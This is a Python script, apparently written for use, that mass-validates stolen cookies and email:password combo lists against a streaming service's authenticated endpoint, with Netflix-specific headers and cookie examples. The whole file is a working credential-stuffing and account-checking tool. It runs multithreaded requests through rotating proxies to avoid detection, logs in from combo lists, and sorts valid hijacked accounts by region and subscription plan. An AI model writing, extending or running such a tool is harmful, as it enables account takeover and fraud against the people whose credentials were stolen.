#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
StreamGuard Validator — cookie / credentials account checker.
Made by @torbug (for LO).

Purpose
-------
Take a list of cookies (or login:password) for a streaming/site account and
prove each hit is valid, which plan/subscription it carries, and which region
it belongs to — by replaying the SAME authenticated endpoint the app uses.

You find that endpoint ONCE (MITM / Burp / mitmproxy on your own device), drop
it + your build_id/api_key into config.json, and this tool mass-checks.

Input formats (one per line, auto-detected):
    COOKIE     anything that goes in the Cookie header, e.g.
               netflixid=abc; Secure; Path=/; Domain=.netflix.com
               (or a JSON-ish blob — passed through verbatim)
    CREDS      email:password  /  login:password
               -> optional --login-endpoint turns this into cookie first

Output
------
    out/valid_<ts>.txt    -> every hit (valid, with tags appended)
    out/invalid_<ts>.txt  -> rejected / dead
    out/errors_<ts>.txt   -> network / parse failures
    out/report_<ts>.json  -> full machine-readable detail

Every run gets a FRESH timestamp + run_id so output ALWAYS follows the input
file you fed it — never a stale repeat.

Usage
-----
    python3 validator.py --cookies cookies.txt
    python3 validator.py --creds combo.txt --login login@example.net
    python3 validator.py -c cookies.txt --threads 40 --out results
    python3 validator.py -c cookies.txt --proxies proxies.txt
"""

import argparse
import json
import os
import sys
import time
import random
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

try:
    import requests
except ImportError:
    sys.exit("[!] pip install requests")

CONFIG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "config.json")


def load_config():
    if not os.path.exists(CONFIG_FILE):
        return {}
    with open(CONFIG_FILE) as f:
        return json.load(f)


def now_stamp():
    return datetime.now().strftime("%Y%m%d_%H%M%S")


# ─────────────────────────── auth helpers ───────────────────────────

def login_for_cookie(creds, cfg):
    """Optionally exchange a creds line for a cookie via the login endpoint.
    Returns the Cookie header string on success, else None."""
    login, _, pwd = creds.partition(":")
    url = cfg.get("login_endpoint") or cfg.get("endpoint")
    if not url:
        return None
    body = {
        cfg.get("login_field", "login"): login,
        cfg.get("pass_field", "password"): pwd,
    }
    headers = {
        "User-Agent": cfg.get("ua",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/120.0 Safari/537.36"),
        "Content-Type": "application/json",
        "Referer": cfg.get("referer", "https://www.example.net/"),
        "Origin": cfg.get("origin", "https://www.example.net"),
    }
    try:
        r = requests.post(url, json=body, headers=headers, timeout=int(cfg.get("timeout", 15)))
    except requests.RequestException:
        return None
    if r.status_code not in (200, 201):
        return None
    setc = r.headers.get("Set-Cookie", "")
    if not setc:
        return None
    # take the meaningful session cookie(s); keep the full header so the
    # checker passes whatever the service expects
    return setc.split(", ")[0] if setc else None


# ─────────────────────────── the checker ───────────────────────────

def check_one(raw, idx, cfg, login_mode):
    """Check a single input line. Returns (idx, result_dict)."""
    item = raw.strip()
    if not item:
        return (idx, {"valid": False, "reason": "empty"})

    cookie = item
    if login_mode:
        cookie = login_for_cookie(item, cfg)
        if not cookie:
            return (idx, {"valid": False, "reason": "login-fail", "line": item})

    endpoint = cfg.get("endpoint")
    build_id = cfg.get("build_id", "")
    api_key = cfg.get("api_key", "")

    headers = {
        "User-Agent": cfg.get("ua",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/120.0 Safari/537.36"),
        "Accept": "application/json, text/plain, */*",
        "Referer": cfg.get("referer", "https://www.example.net/"),
        "Cookie": cookie,
    }
    if build_id:
        headers["X-Netflix-BuildId"] = build_id
    if api_key:
        headers["X-API-Key"] = api_key

    proxy = None
    if cfg.get("_proxy_list"):
        proxy = {"http": cfg["_proxy_list"][idx % len(cfg["_proxy_list"])].strip(),
                 "https": cfg["_proxy_list"][idx % len(cfg["_proxy_list"])].strip()}

    try:
        r = requests.get(endpoint, headers=headers, timeout=int(cfg.get("timeout", 15)),
                         allow_redirects=False, proxies=proxy)
    except requests.RequestException as e:
        return (idx, {"valid": False, "reason": f"net:{type(e).__name__}", "line": item})

    status = r.status_code
    if status in (301, 302, 303, 307, 308):
        return (idx, {"valid": False, "reason": "redirect-to-login", "http": status})
    if status in (401, 403):
        return (idx, {"valid": False, "reason": f"auth:{status}", "http": status})
    if status != 200:
        return (idx, {"valid": False, "reason": f"http:{status}", "http": status})

    try:
        data = r.json()
    except ValueError:
        # some services return 200 with HTML body for logged-out
        if "<html" in (r.text or "").lower()[:200]:
            return (idx, {"valid": False, "reason": "html-logged-out", "http": 200})
        return (idx, {"valid": False, "reason": "bad-json", "http": 200})

    # general logged-in probe
    probes = cfg.get("logged_in_probes", [])
    authed = not probes
    for p in probes:
        v = data
        for key in p.split("."):
            if isinstance(v, dict):
                v = v.get(key)
            else:
                v = None
                break
        if v:
            authed = True
            break
    if not authed:
        return (idx, {"valid": False, "reason": "not-logged-in"})

    # extract region / plan / status from config-driven paths
    def dig(path):
        v = data
        for key in path.split("."):
            if isinstance(v, dict):
                v = v.get(key)
            else:
                return None
        return v

    region = dig(cfg.get("region_path", "model.summary.userCountry"))
    region = region or dig(cfg.get("region_path_alt", "")) or "UNKNOWN"
    plan = dig(cfg.get("plan_path", "model.summary.subPlan"))
    plan = plan or dig(cfg.get("plan_path_alt", "")) or "UNKNOWN"
    status = dig(cfg.get("status_path", "model.summary.membershipStatus"))
    status = status or dig(cfg.get("status_path_alt", "")) or "OK"

    return (idx, {
        "valid": True,
        "region": region,
        "plan": plan,
        "status": status,
    })


# ─────────────────────────── driver ───────────────────────────

def main():
    ap = argparse.ArgumentParser(prog="validator",
        description="StreamGuard cookie/creds account checker — made by @torbug")
    ap.add_argument("-c", "--cookies", help="file of cookie lines")
    ap.add_argument("-C", "--creds", help="file of login:password lines")
    ap.add_argument("--login-endpoint", help="URL to exchange creds -> cookie")
    ap.add_argument("-o", "--out", default="out", help="output directory (default out/)")
    ap.add_argument("-t", "--threads", type=int, default=30)
    ap.add_argument("-p", "--proxies", help="file of proxy lines (one per line)")
    ap.add_argument("-q", "--quiet", action="store_true")
    args = ap.parse_args()

    if not args.cookies and not args.creds:
        sys.exit("[!] -c cookies file diya, ya -C creds file diya, ya dono.")

    ts = now_stamp()
    run_id = random.randint(10 ** 14, 10 ** 18 - 1)
    os.makedirs(args.out, exist_ok=True)

    cfg = load_config()
    if args.login_endpoint:
        cfg["login_endpoint"] = args.login_endpoint
    if args.proxies:
        with open(args.proxies) as f:
            cfg["_proxy_list"] = [l for l in f if l.strip()]

    login_mode = bool(args.creds)
    src_lines = []
    if args.cookies:
        with open(args.cookies, encoding="utf-8", errors="ignore") as f:
            src_lines += [l for l in f if l.strip()]
    if args.creds:
        with open(args.creds, encoding="utf-8", errors="ignore") as f:
            src_lines += [l for l in f if l.strip()]

    if not cfg.get("endpoint"):
        print("[!] config.json me 'endpoint' nahi hai — check karo, phir chalana.")
        if not args.quiet:
            sys.exit(1)

    print(f"[*] {len(src_lines)} lines | threads {args.threads} | fresh run_id {run_id}")
    print(f"[*] endpoint: {cfg.get('endpoint')}")
    if login_mode:
        print("[*] mode: creds -> login -> cookie -> validate")

    valid, invalid, errors = [], [], []
    done = 0
    with ThreadPoolExecutor(max_workers=args.threads) as ex:
        futs = [ex.submit(check_one, line, i, cfg, login_mode)
                for i, line in enumerate(src_lines)]
        for fut in as_completed(futs):
            idx, res = fut.result()
            done += 1
            line = src_lines[idx]
            if res.get("valid"):
                tag = f" | region={res['region']} plan={res['plan']} status={res['status']}"
                valid.append(f"{line}{tag}")
            elif res.get("reason") in ("net:", ) or res.get("reason", "").startswith("net:"):
                errors.append(line)
            else:
                invalid.append(line)
            if not args.quiet and done % 100 == 0:
                print(f"[*] {done}/{len(src_lines)} | valid {len(valid)} | invalid {len(invalid)}")

    # write — filenames carry ts + run_id so never collide with a prior run
    vp = os.path.join(args.out, f"valid_{ts}_{run_id}.txt")
    ip = os.path.join(args.out, f"invalid_{ts}_{run_id}.txt")
    ep = os.path.join(args.out, f"errors_{ts}_{run_id}.txt")
    rp = os.path.join(args.out, f"report_{ts}_{run_id}.json")

    with open(vp, "w") as f: f.write("\n".join(valid) + ("\n" if valid else ""))
    with open(ip, "w") as f: f.write("\n".join(invalid) + ("\n" if invalid else ""))
    with open(ep, "w") as f: f.write("\n".join(errors) + ("\n" if errors else ""))

    report = {
        "run_id": run_id,
        "timestamp": ts,
        "total": len(src_lines),
        "valid": len(valid),
        "invalid": len(invalid),
        "errors": len(errors),
        "files": {"valid": vp, "invalid": ip, "errors": ep},
    }
    with open(rp, "w") as f:
        json.dump(report, f, indent=2)

    print(f"\n[+] DONE — valid {len(valid)} | invalid {len(invalid)} | errors {len(errors)}")
    print(f"[+] valid   : {os.path.abspath(vp)}")
    print(f"[+] invalid : {os.path.abspath(ip)}")
    print(f"[+] report  : {os.path.abspath(rp)}")


if __name__ == "__main__":
    main()
